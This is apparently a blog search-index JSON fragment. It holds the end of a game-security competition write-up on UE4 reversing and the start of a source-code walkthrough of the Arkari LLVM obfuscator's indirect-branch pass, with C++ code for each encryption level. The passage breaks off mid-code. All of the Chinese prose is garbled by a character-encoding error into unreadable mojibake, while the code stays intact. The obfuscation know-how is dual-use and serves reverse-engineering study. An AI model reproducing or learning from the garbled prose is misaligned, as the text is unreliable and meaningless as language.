ä¹Ÿå°è¯•äº†å»ä¿®æ”¹bCollideWithEnvironmentçš„å€¼ï¼Œç„¶è€Œä¹Ÿæ˜¯æ²¡æœ‰æ•ˆæœï¼Œå®åœ¨æ˜¯æƒ³ä¸åˆ°è¿˜æœ‰å“ªäº›åœ°æ–¹ä¼šä¿®æ”¹äº†\næ€»ç»“ è¿™æ¬¡æ¯”èµ›çš„é¢˜ç›®ä¸»è¦æ˜¯è€ƒéªŒå¯¹UE4å¼•æ“çš„ç†Ÿæ‚‰ç¨‹åº¦ï¼Œé€†å‘çš„éƒ¨åˆ†å æ¯”ä¸ç®—ç‰¹åˆ«å¤§ï¼Œä¹Ÿæ²¡æœ‰å‡ºä»€ä¹ˆæ¯”è¾ƒéš¾çš„æ··æ·†åŠ å£³ä¹‹ç±»çš„ï¼Œè™½ç„¶å·²ç»åšå‡ºäº†å¤§éƒ¨åˆ†çš„å†…å®¹ï¼Œä½†æ˜¯è¿˜æ˜¯éœ€è¦åŠ æ·±å¯¹UE4å¼•æ“çš„ç†è§£ï¼Œå¦‚æœå¯¹UE4è¶³å¤Ÿç†Ÿæ‚‰ï¼Œåº”è¯¥èƒ½å‡å°‘å¾ˆå¤šåœ¨å¯»æ‰¾å„ä¸ªç±»ä¹‹é—´çš„å…³ç³»å’Œæ‰€éœ€çš„æˆå‘˜å˜é‡ä¸Šã€‚\n","date":"2025-04-16T00:00:00Z","image":"https://jeremiah.oss-cn-shenzhen.aliyuncs.com/picture/202504161759440.png","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/2025%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-android-%E5%88%9D%E8%B5%9Bwriteup/","title":"2025æ¸¸æˆå®‰å…¨æŠ€æœ¯ç«èµ›-Android-åˆèµ›WriteUp"},{"content":"å‰è¨€ æœ¬æ–‡ä»…å¯¹Arkariç”¨äºæ··æ·†çš„passçš„æºç åˆ†æå’Œè®²è§£ï¼Œæ²¡æœ‰æä¾›å»é™¤æ··æ·†çš„æ–¹æ¡ˆï¼Œè¯·éœ€è¦å»æ··æ·†çš„å¸ˆå‚…è‡ªå·±æƒ³å‡ºè§£å†³æ–¹æ¡ˆï¼Œå¸Œæœ›åˆ†æèƒ½å¤Ÿå¸®åˆ°å„ä½å¸ˆå‚… æ–‡ç« å¤§éƒ¨åˆ†å¯¹æºç çš„è§£é‡Šéƒ½ç›´æ¥ä»¥æ³¨é‡Šçš„å½¢å¼å†™åœ¨ä»£ç ä¸­\nPS: æœ¬æ–‡æ‰€æœ‰åˆ†æå‡åŸºäºå¼€æºé¡¹ç›®Arkariï¼šArkari LLVM19.x æ¶æ„ä¸ºARM64\nArkariæ”¯æŒçš„æ··æ·†ç‰¹æ€§ æ··æ·†è¿‡ç¨‹é—´ç›¸å…³ é—´æ¥è·³è½¬,å¹¶åŠ å¯†è·³è½¬ç›®æ ‡(-mllvm -irobf-indbr) é—´æ¥å‡½æ•°è°ƒç”¨,å¹¶åŠ å¯†ç›®æ ‡å‡½æ•°åœ°å€(-mllvm -irobf-icall) é—´æ¥å…¨å±€å˜é‡å¼•ç”¨,å¹¶åŠ å¯†å˜é‡åœ°å€(-mllvm -irobf-indgv) å­—ç¬¦ä¸²(c string)åŠ å¯†åŠŸèƒ½(-mllvm -irobf-cse) è¿‡ç¨‹ç›¸å…³æ§åˆ¶æµå¹³å¦æ··æ·†(-mllvm -irobf-cff) æ•´æ•°å¸¸é‡åŠ å¯†(-mllvm -irobf-cie) æµ®ç‚¹å¸¸é‡åŠ å¯†(-mllvm -irobf-cfe) ç¼–è¯‘Arkariæºç  1 2 3 4 5 6 git clone https://github.com/KomiMoe/Arkari.git cd Arkari mkdir build cd build cmake -DCMAKE_BUILD_TYPE=Release -DLLVM_ENABLE_PROJECTS=clang -G \u0026#34;Unix Makefiles\u0026#34; ../llvm make -j12 é—´æ¥è·³è½¬ä»‹ç» åœ¨ARM64æ¶æ„ä¸­ï¼Œé—´æ¥è·³è½¬æ··æ·†æ˜¯ä¸€ç§é€šè¿‡ç ´åé™æ€æ§åˆ¶æµå¯è¯»æ€§çš„ä»£ç ä¿æŠ¤æŠ€æœ¯ï¼Œå…¶æ ¸å¿ƒæœºåˆ¶æ˜¯å°†ç¨‹åºä¸­çš„ç›´æ¥è·³è½¬ï¼ˆå¦‚B/BLæŒ‡ä»¤ï¼‰æ›¿æ¢ä¸ºé€šè¿‡é€šç”¨å¯„å­˜å™¨ï¼ˆå¦‚X17ï¼‰é—´æ¥è·³è½¬çš„æ¨¡å¼ï¼Œå¸¸è§å½¢å¼ä¸ºBR X8ç­‰ã€‚ç”±äºIDAç­‰é™æ€åç¼–è¯‘å·¥å…·æ— æ³•ç¡®å®šå¯„å­˜å™¨ä¸­çš„å€¼ï¼Œå¯¼è‡´ç¨‹åºåŸå§‹æ§åˆ¶æµåœ¨é™æ€åˆ†æä¸‹è¢«æˆªæ–­ï¼Œä½¿å¾—é™æ€åˆ†æå¤±æ•ˆã€‚\næºç åˆ†æ é—´æ¥è·³è½¬æ··æ·†çš„æºç åœ¨ç¼–è¯‘å¥½ä¹‹åçš„Arkari/llvm/lib/Transforms/Obfuscationè·¯å¾„ä¸‹çš„IndirectBranch.cppæ–‡ä»¶\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 bool runOnFunction(Function \u0026amp;Fn) override { const auto opt = ArgsOptions-\u0026gt;toObfuscate(ArgsOptions-\u0026gt;indBrOpt(), \u0026amp;Fn); if (!opt.isEnabled()) { return false; } if (Fn.empty() || Fn.hasLinkOnceLinkage() || Fn.getSection() == \u0026#34;.text.startup\u0026#34;) { return false; } LLVMContext \u0026amp;Ctx = Fn.getContext(); // Init member fields BBNumbering.clear(); BBTargets.clear(); // llvm cannot split critical edge from IndirectBrInst SplitAllCriticalEdges(Fn, CriticalEdgeSplittingOptions(nullptr, nullptr)); NumberBasicBlock(Fn); if (BBNumbering.empty()) { return false; } uint64_t V = RandomEngine.get_uint64_t(); uint64_t XV = RandomEngine.get_uint64_t(); IntegerType* intType = Type::getInt32Ty(Ctx); if (pointerSize == 8) { intType = Type::getInt64Ty(Ctx); } ConstantInt *EncKey = ConstantInt::get(intType, V, false); ConstantInt *EncKey1 = ConstantInt::get(intType, -V, false); ConstantInt *Zero = ConstantInt::get(intType, 0); GlobalVariable *GXorKey = nullptr; GlobalVariable *DestBBs = nullptr; GlobalVariable *XorKeys = nullptr; if (opt.level() == 0) { DestBBs = getIndirectTargets0(Fn, EncKey1); } else if (opt.level() == 1 || opt.level() == 2) { ConstantInt *CXK = ConstantInt::get(intType, XV, false); GXorKey = new GlobalVariable(*Fn.getParent(), CXK-\u0026gt;getType(), false, GlobalValue::LinkageTypes::PrivateLinkage, CXK, Fn.getName() + \u0026#34;_IBrXorKey\u0026#34;); appendToCompilerUsed(*Fn.getParent(), {GXorKey}); if (opt.level() == 1) { DestBBs = getIndirectTargets1(Fn, EncKey1, CXK); } else { DestBBs = getIndirectTargets2(Fn, EncKey1, CXK); } } else { auto [fst, snd] = getIndirectTargets3(Fn, EncKey1); DestBBs = fst; XorKeys = snd; } for (auto \u0026amp;BB : Fn) { auto *BI = dyn_cast\u0026lt;BranchInst\u0026gt;(BB.getTerminator()); if (BI \u0026amp;\u0026amp; BI-\u0026gt;isConditional()) { IRBuilder\u0026lt;\u0026gt; IRB(BI); Value *Cond = BI-\u0026gt;getCondition(); Value *Idx; Value *TIdx, *FIdx; TIdx = ConstantInt::get(intType, BBNumbering[BI-\u0026gt;getSuccessor(0)]); FIdx = ConstantInt::get(intType, BBNumbering[BI-\u0026gt;getSuccessor(1)]); Idx = IRB.CreateSelect(Cond, TIdx, FIdx); Value *GEP = IRB.CreateGEP( DestBBs-\u0026gt;getValueType(), DestBBs, {Zero, Idx}); Value *EncDestAddr = IRB.CreateLoad( GEP-\u0026gt;getType(), GEP, \u0026#34;EncDestAddr\u0026#34;); // -EncKey = X - FuncSecret Value *DecKey = EncKey; if (GXorKey) { LoadInst *XorKey = IRB.CreateLoad(GXorKey-\u0026gt;getValueType(), GXorKey); if (opt.level() == 1) { DecKey = IRB.CreateXor(EncKey1, XorKey); DecKey = IRB.CreateNeg(DecKey); } else if (opt.level() == 2) { DecKey = IRB.CreateXor(EncKey1, IRB.CreateMul(XorKey, Idx)); DecKey = IRB.CreateNeg(DecKey); } } if (XorKeys) { Value *XorKeysGEP = IRB.CreateGEP(XorKeys-\u0026gt;getValueType(), XorKeys, {Zero, Idx}); Value *XorKey = IRB.CreateLoad(intType, XorKeysGEP); XorKey = IRB.CreateNeg(XorKey); XorKey = IRB.CreateXor(XorKey, EncKey1); XorKey = IRB.CreateNeg(XorKey); DecKey = IRB.CreateXor(EncKey1, IRB.CreateMul(XorKey, Idx)); DecKey = IRB.CreateNeg(DecKey); } Value *DestAddr = IRB.CreateGEP( Type::getInt8Ty(Ctx), EncDestAddr, DecKey); IndirectBrInst *IBI = IndirectBrInst::Create(DestAddr, 2); IBI-\u0026gt;addDestination(BI-\u0026gt;getSuccessor(0)); IBI-\u0026gt;addDestination(BI-\u0026gt;getSuccessor(1)); ReplaceInstWithInst(BI, IBI); } } return true; } è¿™æ˜¯IndirectBranch.cppçš„runOnFunctionå‡½æ•°ï¼Œåœ¨OLLVMä¸­runOnFunctionå‡½æ•°æ˜¯passæ‰§è¡Œçš„å…¥å£ç‚¹\nStep 1:éšæœºæ‰“ä¹±åŸºæœ¬å— åœ¨å‡½æ•°ä¸­å‡½æ•°é¦–å…ˆåˆå§‹åŒ–äº†ä¸¤ä¸ªæ•°ç»„ï¼š\nBBNumbering : å­˜å‚¨åŸºæœ¬å—åˆ°éšæœºåŒ–ç¼–å·çš„æ˜ å°„ï¼Œç”¨äºåç»­è®¡ç®—è·³è½¬ç´¢å¼• BBTargets : ä¸´æ—¶å­˜å‚¨æ‰€æœ‰å”¯ä¸€æ¡ä»¶åˆ†æ”¯ç›®æ ‡å— è¿™é‡Œéœ€è¦æä¸€ä¸‹ï¼ŒOLLVMä¸­ä¸€ä¸ªå‡½æ•°å¯¹è±¡(Function)æ˜¯ç”±åŸºæœ¬å—(BasicBlock)ç»„æˆï¼Œè€ŒåŸºæœ¬å—ç”±æ¯ä¸€æ¡æŒ‡ä»¤(Instruction)ç»„æˆ\næ¥ç€è°ƒç”¨SplitAllCriticalEdgeså‡½æ•°ï¼Œåˆ†å‰²å…³é”®è¾¹ï¼ŒåŸç†æ˜¯åœ¨æœ‰å¤šä¸ªå‰é©±å’Œåç»§çš„è¾¹ä¹‹é—´æ’å…¥æ–°åŸºæœ¬å—\nå†è°ƒç”¨NumberBasicBlockå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å°†æ‰€æœ‰æ¡ä»¶åˆ†æ”¯ç›®æ ‡åŸºæœ¬å—åˆ†é…éšæœºåŒ–ç¼–å·ï¼Œæ‰“ä¹±ç¨‹åºåŸæœ‰çš„é¡ºåºæ‰§è¡Œæµç¨‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 void NumberBasicBlock(Function \u0026amp;F) { for (auto \u0026amp;BB : F) { // éå†æ‰€æœ‰åŸºæœ¬å— if (auto *BI = dyn_cast\u0026lt;BranchInst\u0026gt;(BB.getTerminator())) { // è·å–åŸºæœ¬å—çš„æœ€åä¸€æ¡è·³è½¬æŒ‡ä»¤ if (BI-\u0026gt;isConditional()) { // åˆ¤æ–­æ˜¯å¦æ˜¯æ¡ä»¶è·³è½¬ unsigned N = BI-\u0026gt;getNumSuccessors(); // Nä¸ºåˆ†æ”¯æ•° for (unsigned I = 0; I \u0026lt; N; I++) { BasicBlock *Succ = BI-\u0026gt;getSuccessor(I); // è·å–åç»§åŸºæœ¬å— if (BBNumbering.count(Succ) == 0) { // æ£€æŸ¥Succæ˜¯å¦å·²å­˜åœ¨äºmapä¸­ BBTargets.push_back(Succ); BBNumbering[Succ] = 0; // æ·»åŠ åˆ°BBTargetså¹¶åˆå§‹åŒ–ç¼–å·ä¸º0 } } } } } long seed = RandomEngine.get_uint32_t(); // éšæœºæ•°ç§å­ std::default_random_engine e(seed); std::shuffle(BBTargets.begin(), BBTargets.end(), e); // ç”¨éšæœºæ•°æ‰“ä¹± unsigned N = 0; for (auto BB:BBTargets) { BBNumbering[BB] = N++; // æ‰“ä¹±çš„åŸºæœ¬å—é‡æ–°ç¼–å· } } ä»£ç çš„æ³¨é‡Šä¸­å·²ç»å†™çš„å¾ˆè¯¦ç»†ï¼Œæ€»ç»“ä¸€ä¸‹å°±æ˜¯ï¼šå¯»æ‰¾æ¡ä»¶è·³è½¬çš„åç»§åŸºæœ¬å—-\u0026gt;éšæœºæ•°æ‰“ä¹±åŸºæœ¬å—-\u0026gt;åŸºæœ¬å—é‡ç¼–å·\nStep 2:åˆå§‹åŒ–åŠ å¯†å¯†é’¥ 1.å¯†é’¥ç”Ÿæˆ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // ç”Ÿæˆ 64 ä½éšæœºå¯†é’¥ uint64_t V = RandomEngine.get_uint64_t(); uint64_t XV = RandomEngine.get_uint64_t(); // æ ¹æ®æŒ‡é’ˆå¤§å°é€‰æ‹©æ•´æ•°ç±»å‹ IntegerType* intType = Type::getInt32Ty(Ctx); if (pointerSize == 8) { intType = Type::getInt64Ty(Ctx); } // æ„é€ åŠ å¯†å¸¸æ•°ï¼ˆæ ¸å¿ƒå¯†é’¥ï¼‰ ConstantInt *EncKey = ConstantInt::get(intType, V, false); // åŠ å¯†å¯†é’¥ ConstantInt *EncKey1 = ConstantInt::get(intType, -V, false); // è§£å¯†å¯†é’¥ ConstantInt *Zero = ConstantInt::get(intType, 0); // é›¶å€¼å¸¸é‡ 2. å…¨å±€å˜é‡å£°æ˜ 1 2 3 GlobalVariable *GXorKey = nullptr; // ä¸€çº§å¼‚æˆ–å¯†é’¥å­˜å‚¨ GlobalVariable *DestBBs = nullptr; // åŠ å¯†è·³è½¬è¡¨ GlobalVariable *XorKeys = nullptr; // åŠ¨æ€å¼‚æˆ–å¯†é’¥æ±  å˜é‡å ç±»å‹ ä½œç”¨ GXorKey GlobalVariable* å­˜å‚¨å…¨å±€å¼‚æˆ–å¯†é’¥ï¼ˆç”¨äºåç»­ Level 1 or 2 æ··æ·†ï¼‰ DestBBs GlobalVariable* å­˜å‚¨åŠ å¯†åçš„è·³è½¬åœ°å€æ•°ç»„ï¼ˆæ ¸å¿ƒè·³è½¬è¡¨ï¼‰ XorKeys GlobalVariable* å­˜å‚¨åŠ¨æ€ç”Ÿæˆçš„å¼‚æˆ–å¯†é’¥æ•°ç»„ï¼ˆåç»­ Level 3 ä½¿ç”¨ï¼‰ step 3:æ ¹æ®opté€‰æ‹©æ··æ·†å¼ºåº¦ è¿™é‡Œå¼•ç”¨ä½œè€…çš„è¯æ¥è§£é‡Šï¼š\nå¯ä»¥ä½¿ç”¨ä¸‹åˆ—å‡ ç§æ–¹æ³•ä¹‹ä¸€å•ç‹¬æ§åˆ¶æŸä¸ªæ··æ·†Passçš„å¼ºåº¦ (Win64-19.1.0-rc3-obf1.5.1-rc5 or later)\nå¦‚æœä¸æŒ‡å®šå¼ºåº¦åˆ™é»˜è®¤å¼ºåº¦ä¸º0ï¼Œannotateçš„ä¼˜å…ˆçº§æ°¸è¿œé«˜äºå‘½ä»¤è¡Œå‚æ•°\nå¯ç”¨çš„Pass:\nicall (å¼ºåº¦èŒƒå›´: 0-3) indbr (å¼ºåº¦èŒƒå›´: 0-3) indgv (å¼ºåº¦èŒƒå›´: 0-3) cie (å¼ºåº¦èŒƒå›´: 0-3) cfe (å¼ºåº¦èŒƒå›´: 0-3) 1.é€šè¿‡annotateå¯¹ç‰¹å®šå‡½æ•°æŒ‡å®šæ··æ·†å¼ºåº¦ï¼š\n^flag=1 è¡¨ç¤ºå½“å‰å‡½æ•°è®¾ç½®æŸåŠŸèƒ½å¼ºåº¦ç­‰çº§(æ­¤å¤„ä¸º1)\n1 2 3 4 5 6 7 8 //^icall=è¡¨ç¤ºæŒ‡å®šicallçš„å¼ºåº¦ //+icallè¡¨ç¤ºå½“å‰å‡½æ•°å¯ç”¨icallæ··æ·†, å¦‚æœä½ åœ¨å‘½ä»¤è¡Œä¸­å¯ç”¨äº†icallåˆ™æ— éœ€æ·»åŠ +icall [[clang::annotate(\u0026#34;+icall ^icall=3\u0026#34;)]] int main() { std::cout \u0026lt;\u0026lt; \u0026#34;HelloWorld\u0026#34; \u0026lt;\u0026lt; std::endl; return 0; } 2.é€šè¿‡å‘½ä»¤è¡Œå‚æ•°æŒ‡å®šç‰¹å®šæ··æ·†Passçš„å¼ºåº¦\nEg.é—´æ¥å‡½æ•°è°ƒç”¨,å¹¶åŠ å¯†ç›®æ ‡å‡½æ•°åœ°å€,å¼ºåº¦è®¾ç½®ä¸º3(-mllvm -irobf-icall -mllvm -level-icall=3)\næ§åˆ¶é€»è¾‘ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 if (opt.level() == 0) { DestBBs = getIndirectTargets0(Fn, EncKey1); //level 0 çš„å¤„ç†é€»è¾‘ } else if (opt.level() == 1 || opt.level() == 2) { //level 1 å’Œ 2 å…±åŒçš„é€»è¾‘ ConstantInt *CXK = ConstantInt::get(intType, XV, false); GXorKey = new GlobalVariable( //ç”Ÿæˆç”¨äºXORçš„keyçš„å…¨å±€å˜é‡ *Fn.getParent(), CXK-\u0026gt;getType(), false, GlobalValue::LinkageTypes::PrivateLinkage, CXK, Fn.getName() + \u0026#34;_IBrXorKey\u0026#34; ); appendToCompilerUsed(*Fn.getParent(), {GXorKey}); if (opt.level() == 1) { DestBBs = getIndirectTargets1(Fn, EncKey1, CXK); //level 1 æ–¹æ¡ˆ } else { DestBBs = getIndirectTargets2(Fn, EncKey1, CXK); //level 2 æ–¹æ¡ˆ } } else { auto [fst, snd] = getIndirectTargets3(Fn, EncKey1); //level 3 æ–¹æ¡ˆ DestBBs = fst; XorKeys = snd; } level 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 GlobalVariable *getIndirectTargets0(Function \u0026amp;F, ConstantInt *EncKey) const { std::string GVName(F.getName().str() + \u0026#34;_IndirectBrTargets\u0026#34;); GlobalVariable *GV = F.getParent()-\u0026gt;getNamedGlobal(GVName); //è·å–å¯¹åº”å‡½æ•°çš„åŠ å¯†åœ°å€çš„å…¨å±€å˜é‡ if (GV) return GV; //å¦‚æœå·²ç»ç”Ÿæˆè¿‡å…¨å±€å˜é‡ï¼Œåˆ™ç›´æ¥è¿”å›ï¼Œé˜²æ­¢é‡å¤ç”Ÿæˆ std::vector\u0026lt;Constant *\u0026gt; Elements; //å­˜å‚¨åŠ å¯†åçš„åŸºæœ¬å—åœ°å€ //éå†éœ€è¦åŠ å¯†çš„åŸºæœ¬å— for (const auto BB:BBTargets) { // è·å–åŸºæœ¬å—åœ°å€å¹¶è½¬æ¢ä¸ºé€šç”¨æŒ‡é’ˆç±»å‹ Constant *CE = ConstantExpr::getBitCast( BlockAddress::get(BB), PointerType::getUnqual(F.getContext()) ); // åŠ å¯†åŸºæœ¬å—åœ°å€ CE = ConstantExpr::getGetElementPtr( Type::getInt8Ty(F.getContext()), CE, //åŸå§‹åœ°å€ EncKey //åŠ å¯†åç§» ); Elements.push_back(CE); } // å®šä¹‰æ•°ç»„ç±»å‹ ArrayType *ATy = ArrayType::get( PointerType::getUnqual(F.getContext()), Elements.size() // æ•°ç»„é•¿åº¦ ); // å°†åŠ å¯†åœ°å€å°è£…ä¸ºå¸¸é‡æ•°ç»„ Constant *CA = ConstantArray::get(ATy, Elements); // åˆ›å»ºå…¨å±€å˜é‡ GV = new GlobalVariable( *F.getParent(), // æ‰€å±æ¨¡å— ATy, // æ•°ç»„ç±»å‹ false, // æ˜¯å¦å¸¸é‡ GlobalValue::LinkageTypes::PrivateLinkage, // é“¾æ¥å±æ€§ CA, // åˆå§‹å€¼ GVName // å˜é‡å ); // é˜²æ­¢ä¼˜åŒ–å™¨åˆ é™¤è¯¥å…¨å±€å˜é‡ appendToCompilerUsed(*F.getParent(), {GV}); return GV; } æ€»ç»“ä¸‹æ¥level 0çš„å¤„ç†å°±æ˜¯ç”Ÿæˆä¸€ä¸ªåŠ å¯†åœ°å€çš„å…¨å±€å˜é‡æ•°ç»„(GV),å¯ä»¥ç”¨ä¸€ä¸ªå…¬å¼æ¥æ¦‚æ‹¬ï¼šåŠ å¯†åœ°å€ = åŸå§‹åœ°å€ + EncKey éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒEncKeyæ˜¯è´Ÿæ•°ï¼Œæ‰€ä»¥ä»£ç ä¸Šçœ‹èµ·æ¥æ˜¯åŠ å¯†åœ°å€ = åŸå§‹åœ°å€ - EncKey\nlevel 1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 GlobalVariable *getIndirectTargets1(Function \u0026amp;F, ConstantInt *AddKey, ConstantInt *XorKey) const { std::string GVName(F.getName().str() + \u0026#34;_IndirectBrTargets1\u0026#34;); GlobalVariable *GV = F.getParent()-\u0026gt;getNamedGlobal(GVName); if (GV) return GV; // encrypt branch targets std::vector\u0026lt;Constant *\u0026gt; Elements; for (const auto BB:BBTargets) { Constant *CE = ConstantExpr::getBitCast( BlockAddress::get(BB), PointerType::getUnqual(F.getContext()) ); CE = ConstantExpr::getGetElementPtr( Type::getInt8Ty(F.getContext()), CE, ConstantExpr::getXor(AddKey, XorKey) //ä¸åŒç‚¹ ); Elements.push_back(CE); } ArrayType *ATy =ArrayType::get( PointerType::getUnqual(F.getContext()), Elements.size() ); Constant *CA = ConstantArray::get(ATy, ArrayRef\u0026lt;Constant *\u0026gt;(Elements)); GV = new GlobalVariable( *F.getParent(), ATy, false, GlobalValue::LinkageTypes::PrivateLinkage, CA, GVName ); appendToCompilerUsed(*F.getParent(), {GV}); return GV; } level 1ä¸»è¦çš„ä¿®æ”¹ç‚¹å°±æ˜¯ConstantExpr::getXor(AddKey, XorKey)è¿™é‡Œï¼Œæ¢æˆå…¬å¼å°±æ˜¯åŠ å¯†åœ°å€ = åŸå§‹åœ°å€ + (AddKey ^ XorKey)\nlevel 2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 GlobalVariable *getIndirectTargets2(Function \u0026amp;F, ConstantInt *AddKey, ConstantInt *XorKey) { std::string GVName(F.getName().str() + \u0026#34;_IndirectBrTargets2\u0026#34;); GlobalVariable *GV = F.getParent()-\u0026gt;getNamedGlobal(GVName); if (GV) return GV; auto\u0026amp; Ctx = F.getContext(); IntegerType *intType = Type::getInt32Ty(Ctx); if (pointerSize == 8) { intType = Type::getInt64Ty(Ctx); } // encrypt branch targets std::vector\u0026lt;Constant *\u0026gt; Elements; for (auto BB:BBTargets) { Constant *CE = ConstantExpr::getBitCast( BlockAddress::get(BB), PointerType::getUnqual(F.getContext()) ); CE = ConstantExpr::getGetElementPtr( Type::getInt8Ty(F.getContext()), CE, ConstantExpr::getXor( //ä¸»è¦ä¿®æ”¹ç‚¹ AddKey, ConstantExpr::getMul( XorKey, ConstantInt::get(intType, BBNumbering[BB], false) ) ) ); Elements.push_back(CE); } ArrayType *ATy =ArrayType::get(PointerType::getUnqual(F.getContext()), Elements.size()); Constant *CA = ConstantArray::get(ATy, ArrayRef\u0026lt;Constant *\u0026gt;(Elements)); GV = new GlobalVariable(*F.getParent(), ATy, false, GlobalValue::LinkageTypes::PrivateLinkage, CA, GVName); appendToCompilerUsed(*F.getParent(), {GV}); return GV; } åŒlevel 1,ä¿®æ”¹ç‚¹åœ¨ä»£ç ä¸­å·²æ ‡å‡ºï¼Œå…¬å¼:åŠ å¯†åœ°å€ = åŸå§‹åœ°å€ + [AddKey ^ (XorKey * Idx)] ç¨å¾®è§£é‡Šä¸€ä¸‹ï¼Œlevel 0 å’Œ level 1çš„keyéƒ½æ˜¯å›ºå®šçš„ï¼Œè€Œlevel 2çš„keyå’ŒåŸºæœ¬å—çš„ç¼–å·æŒ‚é’©ï¼Œæ‰€ä»¥æ¯ä¸ªåŸºæœ¬å—å¯¹åº”çš„è§£å¯†keyéƒ½ä¸ä¸€æ ·\nlevel 3 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 std::pair\u0026lt;GlobalVariable *, GlobalVariable *\u0026gt; getIndirectTargets3(Function \u0026amp;F, ConstantInt *AddKey) { std::string GVNameAdd(F.getName().str() + \u0026#34;_IndirectBrTargets3\u0026#34;); std::string GVNameXor(F.getName().str() + \u0026#34;_IndirectBr3_Xor\u0026#34;); GlobalVariable *GVAdd = F.getParent()-\u0026gt;getNamedGlobal(GVNameAdd); GlobalVariable *GVXor = F.getParent()-\u0026gt;getNamedGlobal(GVNameXor); //æ–°çš„XorKeyæ•°ç»„å…¨å±€å˜é‡ if (GVAdd \u0026amp;\u0026amp; GVXor) return std::make_pair(GVAdd, GVXor); auto\u0026amp; Ctx = F.getContext(); IntegerType *intType = Type::getInt32Ty(Ctx); if (pointerSize == 8) { intType = Type::getInt64Ty(Ctx); } // encrypt branch targets std::vector\u0026lt;Constant *\u0026gt; Elements; std::vector\u0026lt;Constant *\u0026gt; XorKeys; for (auto BB:BBTargets) { uint64_t V = RandomEngine.get_uint64_t(); Constant *XorKey = ConstantInt::get(intType, V, false); Constant *CE = ConstantExpr::getBitCast( BlockAddress::get(BB), PointerType::getUnqual(F.getContext()) ); // åŠ å¯†åœ°å€è®¡ç®— // ä¸level 2ç›¸ä¼¼ï¼Œä½†æ˜¯é‡‡ç”¨åŠ¨æ€å¯†é’¥ CE = ConstantExpr::getGetElementPtr( Type::getInt8Ty(F.getContext()), CE, ConstantExpr::getXor( AddKey, ConstantExpr::getMul( XorKey, ConstantInt::get(intType, BBNumbering[BB], false) ) ) ); //ç‰¹åˆ«ä¹‹å¤„ï¼šä½¿ç”¨å¯†é’¥å¯¹åŸåŸºæœ¬å—åœ°å€åŠ å¯†ä¹‹åï¼Œé€šè¿‡å–åå’Œå¼‚æˆ–ç­‰è¿ç®—æ··æ·†å¯†é’¥ï¼Œä½¿å¾—åŸå¯†é’¥æ›´éš¾è¢«è®¡ç®— XorKey = ConstantExpr::getNeg(XorKey); //XorKey = ~Xorkey XorKey = ConstantExpr::getXor(XorKey, AddKey); //XorKey ^= Addkey XorKey = ConstantExpr::getNeg(XorKey); //Xorkey = ~XorKey XorKeys.push_back(XorKey); Elements.push_back(CE); } ArrayType *ATy =ArrayType::get( PointerType::getUnqual(F.getContext()), Elements.size() ); Constant *CA = ConstantArray::get( ATy, ArrayRef\u0026lt;Constant *\u0026gt;(Elements) ); GVAdd = new GlobalVariable( *F.getParent(), ATy, false, GlobalValue::LinkageTypes::PrivateLinkage, CA, GVNameAdd ); appendToCompilerUsed(*F.getParent(), {GVAdd}); ArrayType *XTy = ArrayType::get(intType, XorKeys.size()); Constant *CX = ConstantArray::get(XTy, XorKeys); GVXor = new GlobalVariable( //æŠŠæ··æ·†åçš„å¯†é’¥æ”¾åˆ°æ–°çš„å…¨å±€å˜é‡ä¸­ *F.getParent(), XTy, false, GlobalValue::LinkageTypes::PrivateLinkage, CX, GVNameXor ); appendToCompilerUsed(*F.getParent(), {GVXor}); return std::make_pair(GVAdd, GVXor); } level 3 çš„åŠ å¯†å…¬å¼å¯ä»¥è¿™ä¹ˆè¡¨ç¤º: åŠ å¯†åœ°å€ = åŸå§‹åœ°å€ + [EncKey1 ^ ( (XorKeys[Idx] ^ EncKey1) * Idx )] level 3åœ¨level 2çš„åŸºç¡€ä¸Šå¢åŠ äº†å¯¹å¯†é’¥çš„æ··æ·†ã€‚å®Œå…¨éšæœºåŒ–çš„åŠ¨æ€å¯†é’¥ + åŒæ•°ç»„éš”ç¦» + æ··æ·†çš„è®¾è®¡ï¼Œä½¿å¾—åŸæ¥ç¡¬ç¼–ç çš„å¯†é’¥æ›´åŠ å®‰å…¨ï¼Œåœ¨åç»­è§£å¯†åŸºæœ¬å—åœ°å€çš„æ—¶å€™å†å¯¹æ··æ·†çš„å¯†é’¥è¿›è¡Œè¿˜åŸï¼Œè¿™ä¹Ÿæ˜¯Arkariå¯¹é—´æ¥è·³è½¬æ··æ·†çš„åˆ›æ–°ç‚¹æ‰€åœ¨\nstep 4:è§£å¯†çœŸå®å—åœ°å€å¹¶æ’å…¥é—´æ¥è·³è½¬æŒ‡ä»¤ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 for (auto \u0026amp;BB : Fn) { auto *BI = dyn_cast\u0026lt;BranchInst\u0026gt;(BB.getTerminator()); if (BI 